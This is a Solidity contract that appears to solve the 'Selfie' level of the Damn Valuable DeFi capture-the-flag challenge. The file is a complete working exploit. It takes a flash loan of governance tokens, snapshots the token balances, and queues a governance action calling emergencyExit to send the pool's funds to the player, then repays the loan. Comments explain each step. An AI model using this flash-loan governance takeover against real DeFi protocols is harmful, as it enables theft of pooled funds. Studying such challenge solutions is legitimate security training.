// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface ISelfiePool {
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) external returns (bool);
}

interface ISimpleGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
}

contract SelfieAttacker is IERC3156FlashBorrower {
    uint private maxFlashLoanAmount;

    address private pool;
    address private token;
    address private governance;
    address private player;

    error UnexpectedFlashLoan();

    constructor(address _pool, address _token, address _governance, address _player, uint _maxFlashLoanAmount) {
        pool = _pool;
        token = _token;
        governance = _governance;  
        player = _player;      
        maxFlashLoanAmount = _maxFlashLoanAmount;
    }
    
    function attack() public {
        
        //take out the max FL => this provides me with gov token
        ISelfiePool(pool).flashLoan(this, token, maxFlashLoanAmount, bytes("")); //calls into onFlashLoan(...) 
    }

    function onFlashLoan(address initiator, address poolToken, uint256 amount, uint256 fee, bytes calldata) external returns (bytes32) {
        if (initiator != address(this) || msg.sender != pool )
            revert UnexpectedFlashLoan();

        //call snapshot() on the pool token => creates snapshot with my tokens from the FL
        DamnValuableTokenSnapshot(poolToken).snapshot();

        //call queueAction => encode function call for : SelfiePool.emergencyExit(address) => 
        //specify player address --- target is SelfiePool
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        ISimpleGovernance(governance).queueAction(pool, 0, data);
        
        //approve tokens for the SelfiePool, so the FL can be paid back
        DamnValuableTokenSnapshot(poolToken).approve(pool, amount);     

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
